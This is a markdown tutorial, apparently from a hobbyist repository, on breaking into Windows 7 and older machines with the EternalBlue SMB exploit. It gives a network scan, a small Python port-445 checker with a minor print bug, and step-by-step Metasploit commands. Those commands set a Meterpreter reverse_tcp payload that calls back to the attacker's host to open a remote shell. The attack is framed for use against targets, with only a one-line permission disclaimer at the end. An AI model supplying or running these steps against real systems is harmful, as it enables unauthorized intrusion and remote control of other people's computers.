# H4CK WINDOWS < 7 👓

Windows is go to os for every nerds, and many of them use windows 7 or down . As an attacker we could take this advantage to hack into system 👨‍💻 . But make sure that target's firewall is off ( already off in majority of cases 😉 )

> The attack we gonna perform is named <a href="https://en.wikipedia.org/wiki/EternalBlue">__Eternalblue__</a> an attack based on `SMB` or port `445`  . This attack was discovered by <a href="https://www.nsa.gov/">__NSA__ [ National Security Agency ]</a> and later leaked by <a href="https://en.wikipedia.org/wiki/The_Shadow_Brokers">__Shadow Brokers__</a> .
>
> - [EternalBlue (wikipedia)](https://en.wikipedia.org/wiki/EternalBlue)
> - [CVE-2017-0144](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2017-0144)

<br />

## Lets attack 🚀🐱‍💻

>Requirements ❗
>
>- victim running windows 7 or down [ firewall must be turned off ]
>- attacker and target must be connected to same network [ at least for this demo ]
>- a hacking linux distro like <a href="https://www.kali.org/">Kali</a> or <a href="https://www.parrotsec.org/">Parrot os</a> or a system with <a href="https://www.metasploit.com/">Metasploit</a> 

We are going to use <a href="https://www.metasploit.com/">__METASPLOIT__</a> because it makes our life so easy 😊

let rock'n roll 👩‍🚀

#### 1 - Scan target 🔍

You can use tools like [__NMAP__](https://nmap.org/) to scan full network, but it can take some time ⏳, so we are gonna use something called `netdiscover` and a `custom python script` .

- Scan network this will return target's IP [ dont't forget to copy this ]

```bash
$ sudo netdiscover
```

- You can create your own scanner using python 😁

  create a file named `scanner.py` with this content

```python
import socket

ip = "" # IP of target
port = 445

try:
    sock = socket.socket()
    sock.connect((ip, port))
    print("[+] {str(port)} is open")
except:
    print(f"[-] {str(port)} is close")
```

run script using

```bash
$ python3 scanner.py
```



#### 2. Attack 💣

Fire up __METASPLOIT__ 🔥

use `use exploit/windows/smb/ms17_010_eternalblue`

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
```

This is a Metasploit prebuild module , you can see the options by typing `show options`

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
```

We will hit up with a lot of options but we are interested only on `LHOST` `LPORT` `RHOSTS`, `PAYLOAD`,

You can set payload by

```bash
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

Metasploit is kind enough to auto configure `LPORT` & `LHOST` ,

you can change it whenever you need

```bash
set RHOSTS <TARGET_IP>
# change if you want or you see `127.0.0.1` beside `LHOST`
set LHOST <YOUR_IP>
set LPORT <ANY_PORT>
```

simply run the exploit by typing `run` or `exploit`

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```

If you done in the right way 🛣 You should get a [Meterpreter](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/) shell back

<br />

CONGRATULATIONS 🥳 You just hacked in to a system 🐱‍💻

__DO NOT HACK ANYONE, UNLESS YOU HAVE PERMISSIONS 👩‍⚖️__

